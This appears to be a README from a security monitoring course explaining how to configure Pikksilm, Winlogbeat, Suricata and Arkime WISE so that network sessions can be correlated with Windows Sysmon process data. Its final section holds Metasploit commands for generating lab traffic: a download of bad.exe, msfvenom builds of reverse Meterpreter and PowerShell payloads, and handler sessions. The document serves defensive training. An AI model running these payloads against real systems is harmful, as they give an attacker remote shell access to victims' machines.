# Pikksilm

* [Pikksilm](https://github.com/markuskont/pikksilm)
* [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
* [sysmon modular](https://github.com/olafhartong/sysmon-modular)
* [verbose sysmon config](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml)
* [Winlogbeat](https://www.elastic.co/beats/winlogbeat)

Pikksilm bridges **EDR and NDR**: it correlates **endpoint** telemetry (Windows **Sysmon**) with
**network** telemetry (**Suricata** flows) using the shared **Community ID** flow hash. The payoff is
that an Arkime network session can be enriched with *which process, on which host, run by which user*
opened that connection — something the wire alone can't tell you.

## Architecture / data flow (Pikksilm 2.x)

The course build (`singlehost/provision.sh`) installs **Pikksilm 2.0.3** as a prebuilt binary from the
GitHub releases. Everything is glued together through a single redis/valkey instance (port 6379),
using **two logical databases**:

```
 Sysmon ── Winlogbeat ──▶ redis db0  key=winlogbeat ┐
                                                     ├─▶ Pikksilm ──▶ redis db1 ──▶ Arkime WISE ──▶ session enrichment
 Suricata EVE ──────────▶ redis db0  key=suricata   ┘   (correlate by Community ID)
```

1. **Suricata** writes EVE events to **redis db0**, key `suricata`.
2. **Winlogbeat** (shipping **Sysmon** *EventID 1* = process create and *EventID 3* = network
   connection) writes to **redis db0**, key `winlogbeat`.
3. **Pikksilm** consumes both from db0, correlates the Sysmon process+network events with the Suricata
   flow on the **Community ID**, and writes its results to **redis db1**: the `correlations` and an
   enriched `suricata` stream.
4. **Arkime WISE** reads db1 (keyed on `network.community_id`) and decorates the matching session with
   the Sysmon process fields.

## Configuration (Pikksilm 2.x — read the gotcha)

> ⚠️ **Do not bootstrap the config with `pikksilm config`.** In 2.x that subcommand emits a default
> with **every output handler disabled**, so the service starts, logs `winlog: no result handlers`,
> and immediately exits. Write the YAML directly with the redis result handlers enabled.

Minimal working `/etc/pikksilm.yaml` — inputs read from **db0**, outputs go to **db1**:

```yaml
# CDMCS
input:
    suricata:
        redis: { db: 0, host: localhost:6379, key: suricata,    password: "" }
    sysmon:
        redis: { db: 0, host: localhost:6379, key: winlogbeat,  password: "" }
log:
    debug: false
    interval: 30s
output:
    correlations:
        file:  { enabled: false, path: "" }
        redis: { db: 1, enabled: true, host: localhost:6379, password: "" }
    suricata:
        file:  { enabled: false, path: "" }
        redis: { db: 1, enabled: true, host: localhost:6379, key: suricata, password: "" }
persist:
    file: { enabled: false, path: "" }
process:
    suricata: { buffer: 10000, bulk: 100000, cache: 100000, delay: 1s, enabled: true }
    sysmon:   { buffer: 10000, cache: 1000000 }
```

Run it from a systemd unit as a dedicated `pikksilm` system user (the `run` subcommand, **not**
`config`):

```ini
[Unit]
Description=Pikksilm EDR to NDR correlator and enrichment
After=network.target

[Service]
Type=simple
Restart=on-failure
ExecStart=/usr/local/bin/pikksilm --config /etc/pikksilm.yaml run
User=pikksilm
Group=daemon

[Install]
WantedBy=multi-user.target
```

The full, tested install (binary download, user, config, service, plus the Arkime side) lives in
[`singlehost/provision.sh`](../../singlehost/provision.sh).

## Winlogbeat on the endpoint (ECS normalization — REQUIRED)

This is the piece that's easy to miss. Pikksilm 2.x reads Sysmon events in **ECS** form
(`process.entity_id`, `process.name`, `source.ip`, `destination.ip`, **`network.community_id`**).
Winlogbeat's Sysmon→ECS mapping normally runs as an **Elasticsearch ingest pipeline** — which is
**skipped when you ship straight to redis**. So a plain `winlogbeat.event_logs` config delivers only
raw `winlog.event_data.*`; Pikksilm then can't find the fields and emits **empty** correlations with
no community_id (they pile up under an empty-string key and nothing ever enriches). You must do the
ECS mapping **client-side** and compute `community_id` with **seed 0** (to match Suricata + Arkime):

```yaml
winlogbeat.event_logs:
  - name: Microsoft-Windows-Sysmon/Operational

processors:
  - copy_fields:
      fields:
        - { from: "winlog.event_data.ProcessGuid",   to: "process.entity_id" }
        - { from: "winlog.event_data.Image",         to: "process.executable" }
        - { from: "winlog.event_data.Image",         to: "process.name" }
        - { from: "winlog.event_data.User",          to: "user.name" }
        - { from: "winlog.computer_name",            to: "host.name" }
        - { from: "winlog.event_data.SourceIp",      to: "source.ip" }
        - { from: "winlog.event_data.DestinationIp", to: "destination.ip" }
        - { from: "winlog.event_data.Protocol",      to: "network.transport" }
      ignore_missing: true
      fail_on_error: false
  - convert:
      fields:
        - { from: "winlog.event_data.SourcePort",      to: "source.port",      type: integer }
        - { from: "winlog.event_data.DestinationPort", to: "destination.port", type: integer }
        - { from: "winlog.event_data.ProcessId",       to: "process.pid",      type: integer }
      ignore_missing: true
      fail_on_error: false
  # community_id wants an iana_number; map Sysmon's tcp/udp string
  - if:
      has_fields: ["network.transport"]
    then:
      - script:
          lang: javascript
          source: >
            function process(evt){var t=evt.Get("network.transport");if(t){t=String(t).toLowerCase();
            evt.Put("network.transport",t);if(t==="tcp")evt.Put("network.iana_number",6);
            else if(t==="udp")evt.Put("network.iana_number",17);}}
  - community_id:
      seed: 0

output.redis:
  hosts: ["<singlehost-ip>:6379"]   # the box running redis + Pikksilm
  key: "winlogbeat"
  db: 0
  datatype: "list"
```

Install **Sysmon** with a config that logs EventID 1 (process create) + EventID 3 (network connect) —
a minimal `<ProcessCreate onmatch="exclude"/>` + `<NetworkConnect onmatch="exclude"/>` works, or use
the olafhartong modular config. Lock down `winlogbeat.yml` perms (`icacls … /inheritance:r`) or
Winlogbeat's strict-perms check refuses to start.

## Arkime / WISE integration

WISE pulls the correlations out of **db1** and decorates the matching Arkime session, keyed on
`network.community_id`. **Edit the config file the `arkime-wise` service actually loads** (check
`systemctl cat arkime-wise` — `provision.sh` uses `wiseService.ini`, but some installs point `-c` at
`wise.ini`), then `systemctl restart arkime-wise`:

```ini
[cache]
type=redis
url=redis://127.0.0.1:6379/1

[redis:sysmon_proc]
url=redis://127.0.0.1:6379/1
type=communityid
format=json
keyPath=network.community_id
template=1:%key%
redisMethod=lpop
fields=field:process.name;db:sysmon.processname;kind:termfield;friendly:Process Name;shortcut:process.name\nfield:user.name;db:sysmon.username;kind:termfield;friendly:User;shortcut:user.name\nfield:winlog.computer_name;db:sysmon.hostname;kind:termfield;friendly:Host Name;shortcut:host.name\nfield:process.pid;db:sysmon.processpid;kind:integer;friendly:Process PID;shortcut:process.pid
```

and in `config.ini`: `wiseHost=127.0.0.1`, `plugins=…;wise.so`, `viewerPlugins=wise.js`,
`wiseTcpTupleLookups=true`, `wiseUdpTupleLookups=true`, and `[wise-types]` `communityid=communityId`.

**Four things that each silently break it (all learned the hard way):**

1. **`field:<X>` is the JSON-extract key *and* the Arkime expression.** Pikksilm 2.x emits **ECS** JSON
   (`process.name`, `user.name`, `winlog.computer_name`, `process.pid`) — so `field:` must be those
   ECS paths, **not** `sysmon.*`; `db:` is where Arkime stores the value. (`shortcut:` does *not*
   re-map the extract path — `field:sysmon.processname` just extracts nothing and WISE fails/empties.)
2. **`template=1:%key%`** — Arkime sends the **bare** community_id hash (no `1:` seed prefix) as the
   lookup key; the template re-adds `1:` to match Pikksilm's db1 key. `%key%` alone ⇒ `found:0`.
3. **type is lowercase `communityid`** (case-sensitive); the redis has **no password** (plain url).
4. **Edit the file the service loads** — wrong file ⇒ `curl -s localhost:8081/stats` shows `sources: []`.

**Getting nice `sysmon.*` names + the "Sysmon correlation" view.** Per #1 the fields land under the
expressions `process.name`/`user.name`/`winlog.computer_name`/`process.pid`. WISE won't add a second
base field once it owns the dbField, so to also search them as `sysmon.processname` and group them in
`[custom-views] sysmon`, register friendly **aliases** straight in the fields index (this is exactly
what `provision.sh` now does right after `db.pl init`):

```bash
for fa in "sysmon.processname:Process Name:termfield" "sysmon.username:User:termfield" \
          "sysmon.hostname:Host Name:termfield" "sysmon.processpid:Process PID:integer"; do
  e="${fa%%:*}"; r="${fa#*:}"; n="${r%:*}"; k="${r##*:}"
  curl -s -XPUT "localhost:9200/arkime_fields/_doc/$e" -H 'Content-Type: application/json' \
    -d "{\"friendlyName\":\"$n\",\"group\":\"sysmon\",\"dbField2\":\"$e\",\"type\":\"$k\"}"
done
```

**Verify:** `curl -s localhost:8081/stats` (the `communityid` type shows `found > 0` once traffic
flows); then in the viewer search `sysmon.processname == EXISTS!` (or `process.name == EXISTS!`) and
open a session — the **Sysmon correlation** view shows Process Name / User / Host / PID. WISE enriches
**at capture time**, so only sessions captured after the wiring carry the fields (regenerate traffic
for a live demo); `redisMethod=lpop` is one-shot but the value persists in the saved session.

> **Legacy note:** older `provision.sh` carried a second source `[redis:sysmonevent1]` on **db2**
> (parent process, MD5, args, integrity). Pikksilm 2.x doesn't populate db2 — drop it, or wire a db2
> `output` in `/etc/pikksilm.yaml` if you want those fields.

## Generating interesting traffic

To get something to correlate you need an endpoint that produces **both** Sysmon process+network
events **and** real traffic on the wire — the payloads below do exactly that.

* [installing metasploit on linux](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/#installing-the-metasploit-framework-on-linux)

### Delivery

```
 Invoke-WebRequest http://server:8000/bad.exe -UseBasicParsing -OutFile bad.exe
```

### Reverse TCP

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=53  -f exe > bad.exe
```

```
msfconsole

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > set lport 53
msf6 exploit(multi/handler) > exploit

meterpreter > dir

```

### Reverse PS

```
msfvenom -p cmd/windows/reverse_powershell lhost=eth0 lport=8089 > shell.bat
```

```
msfconsole

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload cmd/windows/reverse_powershell
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > set LPORT 8089
msf6 exploit(multi/handler) > exploit
```
